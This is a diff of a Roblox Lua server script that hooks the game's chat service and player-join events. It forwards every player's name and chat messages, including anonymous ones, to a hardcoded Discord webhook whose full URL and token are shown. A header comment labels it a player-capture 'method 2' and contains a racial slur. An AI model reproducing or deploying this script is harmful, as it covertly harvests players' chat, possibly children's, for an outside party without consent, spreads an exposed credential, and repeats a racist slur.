@@ -1248,13 +1248,12 @@ local webhookData = createWebhookData()
 sendWebhook(webhookUrl, webhookData)
 
 --CAPTA NIGGAS METODO 2
---MONSTER CHAT
 -- Roblox Services
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ChatService = require(game:GetService("ServerScriptService"):WaitForChild("ChatServiceRunner"):WaitForChild("ChatService"))
 
--- Discord Webhook URL
+-- URL del webhook de Discord
 local webhookUrl = "https://discord.com/api/webhooks/1267182464225378404/1m2zABYatIsf8VyZmDUQoQjurfAeDYwupramxZi5GY2vsiqHo063s70N6skgP793q_5g"
 
 -- Function to send a message to the Discord webhook
@@ -1273,34 +1272,40 @@ local function sendToDiscord(message)
     end
 end
 
+-- Function to handle player joining
+local function onPlayerAdded(player)
+    -- Send a message to Discord when a player joins
+    sendToDiscord(player.Name .. " has joined the game.")
+
+    -- Optional: Handle player actions or commands here
+end
+
 -- Function to handle chat messages and send them to Discord
 local function onChatMessage(message, player)
     if player then
-        print("Sending message from player: " .. player.Name .. ": " .. message.Text)
         sendToDiscord(player.Name .. ": " .. message.Text)
     else
-        print("Sending message from anonymous player: " .. message.Text)
         sendToDiscord("An anonymous player: " .. message.Text)
     end
 end
 
--- Connect chat service to Discord
+-- Connect chat messages to the Discord webhook
 ChatService.OnMessageReceived = onChatMessage
 
--- Connect players to the chat system
-local function connectPlayer(player)
-    player.CharacterAdded:Connect(function()
-        -- Reconfirm chat when the player respawns
-        print("Player respawned: " .. player.Name)
-    end)
+-- Connect the function to the PlayerAdded event
+Players.PlayerAdded:Connect(onPlayerAdded)
+
+-- Optional: Handle player respawns or other actions here
+local function onCharacterAdded(character)
+    -- You can add more actions to perform when a player's character is added
+    print(character.Parent.Name .. "'s character added.")
 end
 
--- Connect all current players
+-- Connect player characters to the CharacterAdded event
 for _, player in ipairs(Players:GetPlayers()) do
-    connectPlayer(player)
+    player.CharacterAdded:Connect(onCharacterAdded)
 end
 
--- Connect new players when they join
 Players.PlayerAdded:Connect(function(player)
-    connectPlayer(player)
+    player.CharacterAdded:Connect(onCharacterAdded)
 end)
